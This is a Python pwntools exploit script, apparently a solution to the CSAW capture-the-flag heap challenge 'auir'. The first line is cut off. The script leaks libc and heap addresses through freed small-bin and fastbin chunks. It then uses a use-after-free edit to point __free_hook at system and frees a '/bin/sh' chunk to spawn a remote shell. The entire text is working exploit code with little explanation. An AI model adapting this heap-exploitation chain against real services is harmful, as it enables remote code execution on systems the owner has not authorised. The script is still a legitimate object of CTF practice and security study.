
m pwn import *
context(arch='amd64', os='linux', log_level='info')

elf = ELF("./auir")
system_main_arena_offset = 0x37f7e8
free_hook = 0x3c67a8

# s = remote('127.0.0.1', 5000)
s = remote("pwn.chal.csaw.io", 7713)
raw_input()

def recv_menu(n, ch=True):
    for _ in xrange(n):
        s.recvline()
    if ch:
        s.recvuntil(">>")

def allocate(n, content):
    s.sendline('1')
    recv_menu(1)
    s.sendline(str(n))
    recv_menu(1)
    s.sendline(content)
    recv_menu(7)

def destroy(n):
    s.sendline('2')
    recv_menu(1)
    s.sendline(str(n))
    s.recvline()
    if not 'SUCCESSFUL' in s.recvline():
        return False
    recv_menu(7)

def see(n, size):
    s.sendline('4')
    recv_menu(1)
    s.sendline(str(n))
    s.recvline()
    r = s.recv(size)
    recv_menu(7)
    return r

def fix(n, size, content):
    s.sendline('3')
    recv_menu(1)
    s.sendline(str(n))
    recv_menu(1)
    s.sendline(str(size))
    recv_menu(1)
    s.sendline(content)
    recv_menu(2, ch=False)
    recv_menu(7)

recv_menu(2, ch=False)
recv_menu(7)


#allocate a small bin to leak libc
allocate(254, "")
#allocate a fastbin to stop it from coalescing to the top chunk
allocate(16, "AAAAAAAA")
#free the smallbin to leak libc
destroy(0)
leak = see(0, 6)
main_arena_leak = u64(leak+'\x00\x00')
success("main_arena_leak :"+hex(main_arena_leak))

#add one more fastbin
allocate(16, "BBBBBBBB")

destroy(1)
destroy(2)

heap_leak = u64(see(2, 8))
success("heap_leak :"+hex(heap_leak))

allocate(16, "/bin/sh")
allocate(16, p64(main_arena_leak-system_main_arena_offset-0x45390+free_hook))

fix(2 + (heap_leak-0x605310)/8, 16, p64(main_arena_leak-system_main_arena_offset))

s.sendline("2")
recv_menu(1)
s.sendline("3")
s.interactive()
